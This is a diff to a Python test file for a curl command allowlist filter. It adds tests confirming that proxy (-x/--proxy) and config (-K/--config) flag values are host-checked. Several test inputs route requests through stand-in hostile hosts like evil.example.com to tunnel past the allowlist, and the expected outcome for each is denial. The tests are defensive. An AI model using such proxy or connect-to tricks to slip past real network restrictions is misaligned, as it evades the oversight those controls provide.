@@ -68,3 +68,20 @@ def test_resolve_and_connect_to_values_still_host_checked():
     assert _decide("curl --connect-to evil.example.com:443:1.2.3.4:443 https://api.github.com/x") == "deny"
     # sanity: a --resolve pinning an allowlisted host is still allowed
     assert _decide("curl --resolve api.github.com:443:1.2.3.4 https://api.github.com/x") == "allow"
+
+
+def test_proxy_flag_value_is_checked_as_a_host():
+    """`-x`/`--proxy` value IS the real TCP peer — it must NOT be skipped, or an
+    allowlisted visible URL could tunnel through an arbitrary proxy (security
+    review on #847)."""
+    assert _decide("curl -x proxy.evil.example.com https://api.github.com/data") == "deny"
+    assert _decide("curl --proxy evil.example.com:8080 https://api.github.com/x") == "deny"
+    # An allowlisted proxy is fine.
+    assert _decide("curl -x 127.0.0.1:3128 https://api.github.com/x") == "allow"
+
+
+def test_config_flag_value_is_not_skipped():
+    """`-K`/`--config` can name a file carrying url=/proxy= directives, so its
+    value stays host-matched (over-blocks the filename — safe direction —
+    rather than blessing an opaque config). (security review on #847)"""
+    assert _decide("curl -K some.config.txt https://api.github.com/x") == "deny"
